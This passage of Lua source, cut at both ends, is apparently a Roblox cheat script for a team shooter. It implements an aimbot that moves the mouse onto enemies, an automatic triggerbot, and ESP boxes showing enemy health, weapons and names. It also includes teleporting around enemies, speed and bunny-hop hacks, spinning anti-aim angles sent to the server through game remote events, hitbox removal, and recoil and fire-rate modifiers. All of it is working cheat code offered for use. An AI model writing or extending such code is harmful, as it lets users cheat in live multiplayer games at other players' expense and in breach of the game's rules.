																false,
																false,
																C.Vec3(),
																100,
																C.Vec3()
															)															
															end
														end
													end
													--[[if values.misc.client.hitlogs.Toggle then -- 
														CreateHitElement(" Hit "..Hit.Parent.Name.." in the "..Hit.Name.."  ",values.misc.client.hitlogs.Color,1 * values.misc.client["log time"].Slider, 0, 280, 0, 22)
													end--]]
												end
												Filter = false
												break
											end
										end
									end
								end
							end
						end
					end
				end 
			elseif values.legit.aimbot["aim assist"].Toggle and values.legit.aimbot["aim assist"].Active and not library.uiopen then 
				local Stats = values.legit.main.default 
				local Ignore = {LocalPlayer.Character, Camera, workspace.Map.Clips, workspace.Map.SpawnPoints, workspace.Debris} 
				local Closest = 9999 
				local Target 
				Fov.Radius = Stats["FOV"].Slider 
				Fov.Visible =  values.legit.settings["draw fov"].Toggle 
				Fov.Color =  values.legit.settings["draw fov"].Color 

				if not C.TBLFIND(Stats.conditions.Jumbobox, "smoke") then 
					C.INSERT(Ignore, workspace.Ray_Ignore) 
				end 

				if not C.TBLFIND(Stats.conditions.Jumbobox, "blind") or LocalPlayer.PlayerGui.Blnd.Blind.BackgroundTransparency > 0.9 then 
					if not C.TBLFIND(Stats.conditions.Jumbobox, "standing") or SelfVelocity.Magnitude < 3 then 
						for _,Player in pairs(Players:GetPlayers()) do 
							if Player.Character and Player.Character:FindFirstChild("Humanoid") and Player.Character:FindFirstChild("Humanoid").Health > 0 then 
								if not values.legit.settings["forcefield check"].Toggle or not Player.Character:FindFirstChildOfClass("ForceField") then 
									if Player.Team ~= LocalPlayer.Team or values.legit.settings["free for all"].Toggle then 
										local Pos, onScreen = Camera:WorldToViewportPoint(Player.Character.HumanoidRootPart.Position) 
										if onScreen then 
											local Magnitude = (C.Vec2(Pos.X, Pos.Y) - C.Vec2(Mouse.X, Mouse.Y)).Magnitude 
											if Magnitude < Stats["FOV"].Slider then 
												local Hitbox = Stats.hitbox.Dropdown == "head" and Player.Character.Head or Stats.hitbox.Dropdown == "chest" and Player.Character.UpperTorso 
												if Stats.hitbox.Dropdown == "closest" then 
													local HeadPos = Camera:WorldToViewportPoint(Player.Character.Head.Position) 
													local TorsoPos = Camera:WorldToViewportPoint(Player.Character.UpperTorso.Position) 
													local HeadDistance = (C.Vec2(HeadPos.X, HeadPos.Y) - C.Vec2(Mouse.X, Mouse.Y)).Magnitude 
													local TorsoDistance = (C.Vec2(TorsoPos.X, TorsoPos.Y) - C.Vec2(Mouse.X, Mouse.Y)).Magnitude 
													if HeadDistance < TorsoDistance then 
														Hitbox = Player.Character.Head 
													else 
														Hitbox = Player.Character.UpperTorso 
													end 
												end 
												if Hitbox ~= nil then 
													if not C.TBLFIND(Stats.conditions.Jumbobox, "visible") then 
														Target = Hitbox 
													else 
														local Ray1 = C.RAY(Camera.CFrame.Position, (Hitbox.Position - Camera.CFrame.Position).unit * (Hitbox.Position - Camera.CFrame.Position).magnitude) 
														local Hit, Pos = workspace:FindPartOnRayWithIgnoreList(Ray1, Ignore, false, true) 
														if Hit and Hit:FindFirstAncestor(Player.Name) then 
															Target = Hitbox 
														end 
													end 
												end 
											end 
										end 
									end 
								end 
							end 
						end 
					end 
				end 

				if Target ~= nil then 
					local Pos = Camera:WorldToScreenPoint(Target.Position) 
					local Magnitude = C.Vec2(Pos.X - Mouse.X, Pos.Y - Mouse.Y) 
					mousemoverel(Magnitude.x/Stats.smoothing.Slider, Magnitude.y/Stats.smoothing.Slider) 
				end 
			end 
			if not values.rage.aimbot.enabled.Toggle and values.legit.aimbot["triggerbot"].Toggle and values.legit.aimbot["triggerbot"].Active and not TriggerDebounce then 
				local Stats = values.legit.main.default 
				if Stats.triggerbot.Toggle then 
					if not C.TBLFIND(Stats.conditions.Jumbobox, "blind") or LocalPlayer.PlayerGui.Blnd.Blind.BackgroundTransparency > 0.9 then 
						if not C.TBLFIND(Stats.conditions.Jumbobox, "standing") or SelfVelocity.Magnitude < 3 then 
							if Mouse.Target and Mouse.Target.Parent and Players:GetPlayerFromCharacter(Mouse.Target.Parent) and Multipliers[Mouse.Target.Name] ~= nil and Client.gun.DMG.Value * Multipliers[Mouse.Target.Name] >= Stats["minimum dmg"].Slider then 
								local OldTarget = Mouse.Target 
								local Player = Players:GetPlayerFromCharacter(Mouse.Target.Parent) 
								if Player.Team ~= LocalPlayer.Team or values.legit.settings["free for all"].Toggle then 
									coroutine.wrap(function() 
										TriggerDebounce = true 
										wait(Stats["delay (ms)"].Slider/1000) 
										repeat RunService.RenderStepped:Wait() 
											if not Client.DISABLED then 
												Client.firebullet() 
											end 
										until Mouse.Target == nil or Player ~= Players:GetPlayerFromCharacter(Mouse.Target.Parent) 
										TriggerDebounce = false 
									end)() 
								end 
							end 
						end 
					end 
				end 
			end 
		end 
	end

	
	pcall(function()
		Fov.Visible = values.legit.settings['draw fov'].Toggle

		Fov.Transparency = values.legit.settings['draw fov'].Transparency
	
		Fov.Color =  values.legit.settings['draw fov'].Color
		Fov.Position = C.Vec2(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
		Fov.Radius = values.legit.main.default['field of view'].Slider
		Fov.Thickness = values.legit.settings['fov thickness'].Slider
		Fov.Filled = values.legit.settings['filled fov'].Toggle
	end)




--[[pcall(function()
	for i,v in pairs(ChamItems) do
		local cham = v[1]
		local fromobject = v[2]
			if cham.Name == 'WallCham' then 
				if cham:IsA('BoxHandleAdornment') then 
					cham.Size = fromobject.Size + C.Vec3( (values.visuals.players['cham thickness'].Slider/10),  (values.visuals.players['cham thickness'].Slider/10),  (values.visuals.players['cham thickness'].Slider/10))
				elseif cham:IsA('CylinderHandleAdornment') then 
					cham.Height = 1.2 + (values.visuals.players['cham thickness'].Slider/10)
					cham.Radius = 0.61 + (values.visuals.players['cham thickness'].Slider/10)
				end
			elseif cham.Name == 'VisibleCham' then
				if cham:IsA('BoxHandleAdornment') then 
					cham.Size = fromobject.Size + C.Vec3( (values.visuals.players['vcham thickness'].Slider/10),  (values.visuals.players['vcham thickness'].Slider/10),  (values.visuals.players['vcham thickness'].Slider/10))
				elseif cham:IsA('CylinderHandleAdornment') then 
					cham.Height = 1.2 + (values.visuals.players['vcham thickness'].Slider/10)
					cham.Radius = 0.61 + (values.visuals.players['vcham thickness'].Slider/10)
				end
			end
		end
end)--]]

	if PlayerIsAlive then
		if values.rage.exploits['around the world'].Toggle and values.rage.exploits['around the world'].Active then 
			for i,v in next, Players:GetChildren() do
				if v ~= LocalPlayer and v.Team ~= LocalPlayer.Team then
					if v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
						aroundtheworld_value=aroundtheworld_value + (0.01 * values.rage.exploits['speed'].Slider)
						LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame*C.CFAngles(0, aroundtheworld_value, 0)*C.CF(0, values.rage.exploits['height'].Slider, values.rage.exploits['distance'].Slider)
						break
					end
				end
			end
		end
		if values.visuals.trail['enable'].Toggle then
			pcall(function()
			if not LocalPlayer.Character.HumanoidRootPart:FindFirstChild('Trail') then 
				Part = LocalPlayer.Character.HumanoidRootPart
				offset = -2
				local Attachment = C.INST('Attachment')
				Attachment.Name = 'A1'
				Attachment.Position = C.Vec3(-0.55602997541428, offset, 0)
				Attachment.Parent = Part
				
				local Trail = C.INST('Trail')
				Trail.LightInfluence = 0
				Trail.TextureMode = Enum.TextureMode.Static
				Trail.LightEmission = 1
				Trail.MaxLength = 10
				Trail.Texture = 'rbxassetid://7485088415'
				Trail.Parent = Part
				Trail.Transparency = NumberSequence.new(0)
				Trail.FaceCamera = false

				local Attachment1 = C.INST('Attachment')
				Attachment1.Name = 'A2'
				Attachment1.Position = C.Vec3(0.55602943897247, offset, 0)
				Attachment1.Parent = Part


				Trail.Attachment0 = Attachment
				Trail.Attachment1 = Attachment1
			else 
				local trail = LocalPlayer.Character.HumanoidRootPart.Trail
				local a1 = LocalPlayer.Character.HumanoidRootPart.A1
				local a2 = LocalPlayer.Character.HumanoidRootPart.A2

				trail.MaxLength = values.visuals.trail['max length'].Slider
				
				trail.Texture = values.visuals.trail['image type'].Dropdown == "normal" and "rbxassetid://5854341017" or values.visuals.trail['image type'].Dropdown == "lightning 2" and "rbxasssetid://7062832223" or values.visuals.trail['image type'].Dropdown == "lightning 3" and "rbxassetid:/446111271" or values.visuals.trail['image type'].Dropdown == 'custom' and 'rbxassetid://'..values.visuals.trail['image'].Text

				if values.visuals.trail['custom color'].Toggle then 
					trail.Color = ColorSequence.new(values.visuals.trail['custom color'].Color)
				else 
					trail.Color = ColorSequence.new(C.COL3RGB(255, 255, 255))
				end

				a1.Position = C.Vec3(values.visuals.trail['size (x,z)'].Slider/10, 5-(values.visuals.trail['offset (y)'].Slider)/5, 0)
				a2.Position = C.Vec3(-values.visuals.trail['size (x,z)'].Slider/10, 5-(values.visuals.trail['offset (y)'].Slider/5), 0)
				trail.FaceCamera = values.visuals.trail['face camera'].Toggle

			end
		    end)
		elseif LocalPlayer.Character.HumanoidRootPart:FindFirstChild('Trail') then 
			LocalPlayer.Character.HumanoidRootPart.Trail:Remove()
		end
		
		local SelfVelocity = LocalPlayer.Character.HumanoidRootPart.Velocity

		if values.misc.animations.enabled.Toggle then
			if LoadedAnim then 
				if savedanimationdance ~= Dance then 
					savedanimationdance = Dance
					LoadedAnim:Stop()
				end
				if not LoadedAnim.IsPlaying then 
					savedanimationdance = Dance
					LoadedAnim = LocalPlayer.Character.Humanoid:LoadAnimation(Dance)
					LoadedAnim.Priority = Enum.AnimationPriority.Action
					LoadedAnim:Play()
					LoadedAnim:AdjustSpeed(values.misc.animations['animation speed'].Slider)
				end
			else 
				savedanimationdance = Dance
				LoadedAnim = LocalPlayer.Character.Humanoid:LoadAnimation(Dance)
				LoadedAnim.Priority = Enum.AnimationPriority.Action
				LoadedAnim:Play()
				LoadedAnim:AdjustSpeed(values.misc.animations['animation speed'].Slider)
			end
		else 
			if LoadedAnim then 
				LoadedAnim:Stop()
			end
		end


		Root = LocalPlayer.Character.HumanoidRootPart
		frchr = workspace:FindFirstChild('FreezeCharacter2') or workspace:FindFirstChild('FreezeCharacter')
		if frchr and frchr.Size.x >= 5 then 
			Root = frchr
		end
		if values.misc.client['infinite crouch'].Toggle then
			Client.crouchcooldown = 0
		end
		if values.misc.client['auto join team'].Toggle then
			game:GetService('ReplicatedStorage').Events.JoinTeam:FireServer(values.misc.client['team'].Dropdown)
		end
		if C.TBLFIND(values.misc.client['gun modifiers'].Jumbobox, 'firerate') then
			Client.DISABLED = false
		end
		peektimewait=peektimewait+1
		if values.rage['Quick peeks']['quick peek'].Toggle and allowedtofreeze  then
			if values.rage['Quick peeks']['quick peek'].Active then 
				if not workspace:FindFirstChild('FreezeCharacter') then 
					local part = C.INST('Part', workspace)

					if values.rage['Quick peeks']['peek method'].Dropdown == 'freeze' then
						part.Size = C.Vec3(15,1,15) 
					else 
						part.Size = C.Vec3(0, 0, 0)
					end

					part.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
					part.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
					part.CanCollide = false
					part.Transparency = 1
					part.Name = 'FreezeCharacter'
		

					local weld = C.INST('Weld',part)
					weld.Part0 = part
					weld.Part1 = game.Players.LocalPlayer.Character.HumanoidRootPart

					local visualize = C.INST('MeshPart', part)
					visualize.Size = C.Vec3(0.5, 0.2, 0.5) 
					visualize.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position+C.Vec3(0, -3 , 0)
					visualize.CanCollide = false
					visualize.Anchored = true
					visualize.MeshId = 'rbxassetid://5536195161'
					visualize.Material = 'Neon'
					visualize.Color = values.rage['Quick peeks']['visualize circle'].Color

					visualize.Name = 'no'
					if values.rage['Quick peeks']['visualize circle'].Toggle then
						visualize.Transparency = values.rage['Quick peeks']['visualize circle'].Transparency
					else 
						visualize.Transparency = 1
					end

				else 
					if not freezebusy2 and values.rage['Quick peeks']['time limit'].Toggle then 
						if peektimewait >= values.rage['Quick peeks']['time duration'].Slider then 
							peektimewait = 0
							freezebusy2 = true

							wait(0.2)

							pcall(function()
								workspace.FreezeCharacter.Size = C.Vec3(0,0,0)

								wait(values.rage['Quick peeks']['wbr'].Slider/100)
	
								workspace.FreezeCharacter:Remove()
							end)


							freezebusy2 = false
						end
					end
					if not freezebusy1 and values.rage['Quick peeks']['limit peek'].Toggle then
						if workspace:FindFirstChild('FreezeCharacter') and (workspace.FreezeCharacter.no.Position - workspace.Camera.Focus.p).Magnitude > values.rage['Quick peeks']['limit distance'].Slider then
							freezebusy1 = true

							wait(0.2)

							pcall(function()
								workspace.FreezeCharacter.Size = C.Vec3(0,0,0)
								
								wait(values.rage['Quick peeks']['wbr'].Slider/100)

								workspace.FreezeCharacter:Remove()
							end)

							freezebusy1 = false
						end
					end
				end
			else 
				peektimewait=0

				if workspace:FindFirstChild('FreezeCharacter') then 
					workspace:FindFirstChild('FreezeCharacter'):Remove()
				end
			end 
		else 
			peektimewait=0

			if workspace:FindFirstChild('FreezeCharacter') then 
				workspace:FindFirstChild('FreezeCharacter'):Remove()
			end
		end
		
		if C.TBLFIND(values.visuals.effects.removals.Jumbobox, 'scope lines') then 
			NewScope.Enabled = LocalPlayer.Character:FindFirstChild('AIMING') and true or false
			Crosshairs.Scope.Visible = false
		else
			NewScope.Enabled = false
		end
		
		BodyVelocity:Destroy()
		BodyVelocity = C.INST('BodyVelocity')
		BodyVelocity.MaxForce = C.Vec3(C.HUGE,0,C.HUGE)
		if UserInputService:IsKeyDown('Space') and values.misc.movement['bunny hop'].Toggle and values.misc.movement.type.Dropdown ~= "Crim" then
			local add = 0
			if values.misc.movement.direction.Dropdown == 'directional' or values.misc.movement.direction.Dropdown == 'directional 2' then
				if UserInputService:IsKeyDown("A") then add = 90 end 
				if UserInputService:IsKeyDown("S") then add = 180 end 
				if UserInputService:IsKeyDown("D") then add = 270 end 
				if UserInputService:IsKeyDown("A") and UserInputService:IsKeyDown("W") then add = 45 end 
				if UserInputService:IsKeyDown("D") and UserInputService:IsKeyDown("W") then add = 315 end 
				if UserInputService:IsKeyDown("D") and UserInputService:IsKeyDown("S") then add = 225 end 
				if UserInputService:IsKeyDown("A") and UserInputService:IsKeyDown("S") then add = 145 end 
			end
			local rot = YROTATION(CamCFrame) * C.CFAngles(0,C.RAD(add),0)
			local bhopspeed = values.misc.movement['overwrite'].Toggle and values.misc.movement['overwrite'].Active and values.misc.movement['overwrite speed'].Slider or values.misc.movement['speed'].Slider
			BodyVelocity.Parent = LocalPlayer.Character.UpperTorso
							if LocalPlayer.Character.Humanoid.FloorMaterial ~= Enum.Material.Air then
								LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
							end	
			BodyVelocity.Velocity = C.Vec3(rot.LookVector.X,0,rot.LookVector.Z) * (bhopspeed * 2)
			if add == 0 and values.misc.movement.direction.Dropdown == 'directional' and not UserInputService:IsKeyDown('W') then
				BodyVelocity:Destroy()
			else


				if values.misc.movement.type.Dropdown == 'cframe' and values.misc.movement.type.Dropdown ~= "Crim"  then
					BodyVelocity:Destroy()
					Root.CFrame = Root.CFrame + C.Vec3(rot.LookVector.X,0,rot.LookVector.Z) * bhopspeed/50
				elseif values.misc.movement.type.Dropdown == 'velocity' and values.misc.movement.type.Dropdown ~= "Crim"  then
					BodyVelocity:Destroy()
					Root.Velocity = C.Vec3(rot.LookVector.X * (bhopspeed * 2), Root.Velocity.y, rot.LookVector.Z * (bhopspeed * 2))
				elseif values.misc.movement.type.Dropdown == 'idk' and values.misc.movement.type.Dropdown ~= "Crim"  then
					BodyVelocity:Destroy()
					spawn(function()
						if not switchtrigger[1]  then 
							switchtrigger[1] = true
							wait(0.5)
							switchtrigger[3] = Root.CFrame
							Root.CFrame = switchtrigger[2]
	
							wait(0.1)
							Root.CFrame = switchtrigger[3]
							switchtrigger[1] = false
						end
					end)
					
					Root.CFrame = Root.CFrame + C.Vec3(rot.LookVector.X, 0, rot.LookVector.Z) * bhopspeed/50
				end
			end
		end
		



		if values.misc.movement['no launch'].Toggle and values.misc.movement['no launch'].Active then 
			if Root.Velocity.Y > values.misc.movement['launch block (y velocity)'].Slider then 
				Root.Velocity = C.Vec3(Root.Velocity.x, 0, Root.Velocity.z)
			end
		end
		if values.misc.movement['edge jump'].Toggle and values.misc.movement['edge jump'].Active then
			if LocalPlayer.Character.Humanoid:GetState() ~= Enum.HumanoidStateType.Freefall and LocalPlayer.Character.Humanoid:GetState() ~= Enum.HumanoidStateType.Jumping then
				coroutine.wrap(function()
					RunService.RenderStepped:Wait()
					if LocalPlayer.Character ~= nil and LocalPlayer.Character:FindFirstChild('Humanoid') and LocalPlayer.Character.Humanoid:GetState() == Enum.HumanoidStateType.Freefall and LocalPlayer.Character.Humanoid:GetState() ~= Enum.HumanoidStateType.Jumping then
						LocalPlayer.Character.Humanoid:ChangeState('Jumping')
					end
				end)()
			end
		end



-------------------------------------------------------------------------------------------
		spawn(function()
			if not jitterwait then
				jitterwait = true
				Jitter = not Jitter
				wait(values.rage.angles['jitter wait (ms)'].Slider/100) 
				jitterwait = false
			end
		end)
		Spin = C.CLAMP(Spin + values.rage.angles['spin speed'].Slider, 0, 360)
		if Spin == 360 then Spin = 0 end
		LocalPlayer.Character.Humanoid.AutoRotate = false
		if values.rage.angles.enabled.Toggle and not DisableAA then
			local Angle = -C.ATAN2(CamLook.Z, CamLook.X) + C.RAD(-90)
			if values.rage.angles['yaw base'].Dropdown == 'spin' then
				Angle = Angle + C.RAD(Spin)
			end
			if values.rage.angles['yaw base'].Dropdown == 'random' then
				Angle = Angle + C.RAD(C.RANDOM(0, 360))
			end
			if values.rage.angles["yaw base"].Dropdown == "wasd yaw base" then 
				if game:GetService("UserInputService"):IsKeyDown("W") then
					Angle = Angle + 0
				end
				if game:GetService("UserInputService"):IsKeyDown("A") then
					Angle = Angle + 90
				end
				if game:GetService("UserInputService"):IsKeyDown("S") then
					Angle = Angle + -180
				end
				if game:GetService("UserInputService"):IsKeyDown("D") then
					Angle = Angle + -90
				end
			end 
			local Offset = C.RAD(-values.rage.angles['yaw offset'].Slider - (values.rage.angles.jitter.Toggle and Jitter and values.rage.angles['jitter offset'].Slider or values.rage.angles['shoot pitch'].Toggle and shotthingy and values.rage.angles['offset'].Slider or 0))
			local CFramePos = C.CF(Root.Position) * C.CFAngles(0, Angle + Offset, 0)

			if values.rage.angles['yaw base'].Dropdown == 'targets' then
				local part
				local closest = 9999999
				for _,plr in pairs(Players:GetPlayers()) do
					if plr.Character and plr.Character:FindFirstChild('Humanoid') and plr.Character:FindFirstChild('Humanoid').Health > 0 and plr.Team ~= LocalPlayer.Team then
						local pos, onScreen = Camera:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
						local magnitude = (C.Vec2(pos.X, pos.Y) - C.Vec2(Mouse.X, Mouse.Y)).Magnitude
						if closest > magnitude then
							part = plr.Character.HumanoidRootPart
							closest = magnitude
						end
					end
				end
				
				if part ~= nil then
					CFramePos = C.CF(Root.Position, part.Position) * C.CFAngles(0, Offset, 0)
				end
			end
			if values.rage.angles['lock yaw'].Toggle and values.rage.angles['lock yaw'].Active then 
				if lockyaw == nil then 
					lockyaw = Angle
				end
				CFramePos = C.CF(Root.Position) * C.CFAngles(0, lockyaw + Offset, 0)
			else 
				lockyaw = Angle
			end
			Root.CFrame = YROTATION(CFramePos)
			switch180roll = not switch180roll
			if values.rage.angles['body roll'].Dropdown == 'switch' then
				if switch180roll then 
					Root.CFrame = Root.CFrame * C.CFAngles(C.RAD(180), 0, 0)
					LocalPlayer.Character.Humanoid.HipHeight = 1.5
					LocalPlayer.Character.Humanoid.CameraOffset = C.Vec3(0, -2.7, 0)
				else
					LocalPlayer.Character.Humanoid.HipHeight = 1.5
				end
			end

			if values.rage.angles['body roll'].Dropdown == '180' then
				Root.CFrame = Root.CFrame * C.CFAngles(values.rage.angles['body roll'].Dropdown == '180' and C.RAD(180 + values.rage.angles['roll offset'].Slider) or 0, 0, 0)
				LocalPlayer.Character.Humanoid.HipHeight = 2
			else
				LocalPlayer.Character.Humanoid.HipHeight = 2
			end

			savedspinpitch=savedspinpitch+0.25
			local Pitch = values.rage.angles['pitch'].Dropdown == 'none' and CamLook.Y or values.rage.angles['pitch'].Dropdown == 'up' and 1 or values.rage.angles['pitch'].Dropdown == 'down' and -1 or values.rage.angles['pitch'].Dropdown == 'zero' and 0 or values.rage.angles['pitch'].Dropdown == 'among' and C.HUGE or values.rage.angles['pitch'].Dropdown == 'random' and Random.new():NextNumber(-50,50) or values.rage.angles['pitch'].Dropdown == 'spin' and savedspinpitch 

			if values.rage.angles['extend pitch'].Toggle and (values.rage.angles['pitch'].Dropdown == 'up' or values.rage.angles['pitch'].Dropdown == 'down') then
				Pitch = (Pitch*2)/1.6
			end
			if values.rage.angles['custom pitch'].Toggle then
			    Pitch = values.rage.angles['pitch value'].Slider/7
			end
			if values.rage.angles.jitter.Toggle and Jitter then 
				Pitch = values.rage.angles['jitter pitch'].Slider/7
			end

			if values.rage.angles['shoot pitch'].Toggle and shotthingy then 
				Pitch = values.rage.angles['pitch'].Slider/7
			end

			if values.rage.angles['overwrite keybind'].Toggle and values.rage.angles['overwrite keybind'].Active then
				Pitch = values.rage.angles['overwrite pitch'].Dropdown == 'none' and CamLook.Y or values.rage.angles['overwrite pitch'].Dropdown == 'up' and 1 or values.rage.angles['overwrite pitch'].Dropdown == 'down' and -1 or values.rage.angles['overwrite pitch'].Dropdown == 'zero' and 0 or values.rage.angles['overwrite pitch'].Dropdown == 'among' and C.HUGE or values.rage.angles['overwrite pitch'].Dropdown == 'random' and Random.new():NextNumber(0.01,10) or values.rage.angles['overwrite pitch'].Dropdown == 'spin' and savedspinpitch
		    end
			if game.ReplicatedStorage.Events:FindFirstChild('Control') then
			game.ReplicatedStorage.Events.Control:FireServer(Pitch, true)
			end
			game.ReplicatedStorage.Events.ControlTurn:FireServer(Pitch, false)
		else
			LocalPlayer.Character.Humanoid.HipHeight = 2
			Root.CFrame = C.CF(Root.Position) * C.CFAngles(0, -C.ATAN2(CamLook.Z, CamLook.X) + C.RAD(270), 0)
			 if game.ReplicatedStorage.Events:FindFirstChild('Control') then
			game.ReplicatedStorage.Events.Control:FireServer(CamLook.Y, true)
			end
			game.ReplicatedStorage.Events.ControlTurn:FireServer(CamLook.Y, false)
		end
		if values.rage.others['remove head'].Toggle then
			if LocalPlayer.Character:FindFirstChild('FakeHead') then
				LocalPlayer.Character.FakeHead:Destroy()
			end
			if LocalPlayer.Character:FindFirstChild('HeadHB') then
				LocalPlayer.Character.HeadHB:Destroy()
			end
		end
		if C.TBLFIND(values.misc.client['gun modifiers'].Jumbobox, 'recoil') then
			Client.resetaccuracy()
			Client.RecoilX = 0
			Client.RecoilY = 0
		end
		
	else 
		pcall(function()
			workspace:FindFirstChild('FreezeCharacter'):Remove()
		end)
	end
	for _,Player in pairs(Players:GetPlayers()) do
		if Player.Character and Player ~= LocalPlayer and Player.Character:FindFirstChild('HumanoidRootPart') and Player.Character.HumanoidRootPart:FindFirstChild('OldPosition') then
			coroutine.wrap(function()
				local Position = Player.Character.HumanoidRootPart.Position
				RunService.RenderStepped:Wait()
				if Player.Character and Player ~= LocalPlayer and Player.Character:FindFirstChild('HumanoidRootPart') then
					if Player.Character.HumanoidRootPart:FindFirstChild('OldPosition') then
						Player.Character.HumanoidRootPart.OldPosition.Value = Position
					else
						local Value = C.INST('Vector3Value')
						Value.Name = 'OldPosition'
						Value.Value = Position
						Value.Parent = Player.Character.HumanoidRootPart
					end
				end
			end)()
		end
	end
	for _,Player in pairs(Players:GetPlayers()) do
		local tbl = objects[Player]
		if tbl == nil then return end
		if Player.Character and Player.Character:FindFirstChild('HumanoidRootPart') and Player.Team ~= 'TTT' and (Player.Team ~= LocalPlayer.Team or values.visuals.players.teammates.Toggle) and Player.Character:FindFirstChild('Gun') and Player.Character:FindFirstChild('Humanoid') and Player ~= LocalPlayer then
			local HumanoidRootPart = Player.Character.HumanoidRootPart
			local RootPosition = HumanoidRootPart.Position
			local Pos, OnScreen = Camera:WorldToViewportPoint(RootPosition)
			local Size = (Camera:WorldToViewportPoint(RootPosition - C.Vec3(0, 3, 0)).Y - Camera:WorldToViewportPoint(RootPosition + C.Vec3(0, 2.6, 0)).Y) / 2

			local Drawings, Text = C.TBLFIND(values.visuals.players.outlines.Jumbobox, 'drawings') ~= nil, C.TBLFIND(values.visuals.players.outlines.Jumbobox, 'text') ~= nil

			tbl.Box.Color = (values.rage['Loop kill']['Target box'].Toggle and Player.Name == values.rage['Loop kill'].Player.Dropdown and values.rage['Loop kill']['Target box'].Color or values.visuals.players.box.Color)
			tbl.Box.Size = C.Vec2(Size * 1.5, Size * 1.9)
			tbl.Box.Position = C.Vec2(Pos.X - Size*1.5 / 2, (Pos.Y - Size*1.6 / 2))

			-- edited
			
			if values.visuals.players.box.Toggle or (values.rage['Loop kill']['Target box'].Toggle and Player.Name == values.rage['Loop kill'].Player.Dropdown) then
				tbl.Box.Visible = OnScreen
				tbl.Box.Thickness = 0.001
				if Drawings then
					tbl.BoxOutline.Size = tbl.Box.Size
					tbl.BoxOutline.Position = tbl.Box.Position
					tbl.BoxOutline.Visible = OnScreen
				else
					tbl.BoxOutline.Visible = false
				end
			else
				tbl.Box.Visible = false
				tbl.BoxOutline.Visible = false
			end

			if values.visuals.players.health.Toggle or (values.rage['Loop kill']['Target health'].Toggle and Player.Name == values.rage['Loop kill'].Player.Dropdown) then
				tbl.Health.Color = (values.rage['Loop kill']['Target health'].Toggle and Player.Name == values.rage['Loop kill'].Player.Dropdown and values.rage['Loop kill']['Target health'].Color or values.visuals.players.health.Color)
				tbl.Health.From = C.Vec2((tbl.Box.Position.X - 5), tbl.Box.Position.Y + tbl.Box.Size.Y)
				tbl.Health.To = C.Vec2(tbl.Health.From.X, tbl.Health.From.Y - C.CLAMP(Player.Character.Humanoid.Health / Player.Character.Humanoid.MaxHealth, 0, 1) * tbl.Box.Size.Y)
				tbl.Health.Visible = OnScreen
				if Drawings then
					tbl.HealthOutline.From = C.Vec2(tbl.Health.From.X, tbl.Box.Position.Y + tbl.Box.Size.Y + 1)
					tbl.HealthOutline.To = C.Vec2(tbl.Health.From.X, (tbl.Health.From.Y - 1 * tbl.Box.Size.Y) -1)
					tbl.HealthOutline.Visible = OnScreen
				else
					tbl.HealthOutline.Visible = false
				end
			else
				tbl.Health.Visible = false
				tbl.HealthOutline.Visible = false
			end

			if values.visuals.players.weapon.Toggle or (values.rage['Loop kill']['Target weapon'].Toggle and Player.Name == values.rage['Loop kill'].Player.Dropdown) then
				tbl.Weapon.Color = (values.rage['Loop kill']['Target weapon'].Toggle and Player.Name == values.rage['Loop kill'].Player.Dropdown and values.rage['Loop kill']['Target weapon'].Color or values.visuals.players.weapon.Color)
				tbl.Weapon.Text = Player.Character.EquippedTool.Value
				tbl.Weapon.Position = C.Vec2(tbl.Box.Size.X/2 + tbl.Box.Position.X, tbl.Box.Size.Y + tbl.Box.Position.Y + 1)
				tbl.Weapon.Font = Drawing.Fonts[values.visuals.players.font.Dropdown]
				tbl.Weapon.Outline = Text
				tbl.Weapon.Size = values.visuals.players.size.Slider
				tbl.Weapon.Visible = OnScreen
			else
				tbl.Weapon.Visible = false
			end

			if values.visuals.players['weapon icon'].Toggle or (values.rage['Loop kill']['Target weapon icon'].Toggle and Player.Name == values.rage['Loop kill']['Player'].Dropdown) then
				Items[Player.Name].ImageColor3 = (values.rage['Loop kill']['Target weapon icon'].Toggle and Player.Name == values.rage['Loop kill']['Player'].Dropdown and values.rage['Loop kill']['Target weapon icon'].Color or values.visuals.players['weapon icon'].Color)
				Items[Player.Name].Image = GetIcon.getWeaponOfKiller(Player.Character.EquippedTool.Value)
				Items[Player.Name].Position = C.UDIM2(0, tbl.Box.Size.X/2 + tbl.Box.Position.X, 0, tbl.Box.Size.Y + tbl.Box.Position.Y + (values.visuals.players.weapon.Toggle and -10 or -22))
				Items[Player.Name].Visible = OnScreen
			else
				Items[Player.Name].Visible = false
			end

			if values.visuals.players.name.Toggle or (values.rage['Loop kill']['Target name'].Toggle and Player.Name == values.rage['Loop kill']['Player'].Dropdown)  then
				tbl.Name.Color = (values.rage['Loop kill']['Target name'].Toggle and Player.Name == values.rage['Loop kill']['Player'].Dropdown and values.rage['Loop kill']['Target name'].Color or values.visuals.players.name.Color)
				tbl.Name.Text = Player.Name
				tbl.Name.Position = C.Vec2(tbl.Box.Size.X/2 + tbl.Box.Position.X,  tbl.Box.Position.Y - 16)
				tbl.Name.Font = Drawing.Fonts[values.visuals.players.font.Dropdown]
				tbl.Name.Outline = Text
				tbl.Name.Size = values.visuals.players.size.Slider
				tbl.Name.Visible = OnScreen
			else
				tbl.Name.Visible = false
			end
			local LastInfoPos = tbl.Box.Position.Y - 1
			if C.TBLFIND(values.visuals.players.indicators.Jumbobox, 'armor') and Player:FindFirstChild('Kevlar') then
				tbl.Armor.Color = C.COL3RGB(0, 150, 255)
				tbl.Armor.Text = Player:FindFirstChild('Helmet') and 'HK' or 'K'
				tbl.Armor.Position = C.Vec2(tbl.Box.Size.X + tbl.Box.Position.X + 12, LastInfoPos)
				tbl.Armor.Font = Drawing.Fonts[values.visuals.players.font.Dropdown]
				tbl.Armor.Outline = Text
				tbl.Armor.Size = values.visuals.players.size.Slider
				tbl.Armor.Visible = OnScreen

				LastInfoPos = LastInfoPos + values.visuals.players.size.Slider
			else
				tbl.Armor.Visible = false
			end
		else
			if Player.Name ~= LocalPlayer.Name then
				Items[Player.Name].Visible = false
				for i,v in pairs(tbl) do
					v.Visible = false
				end
			end
		end
	end
	
	if workspace:FindFirstChild('Map') and Client.gun ~= 'none' and Client.gun.Name ~= 'C4' then
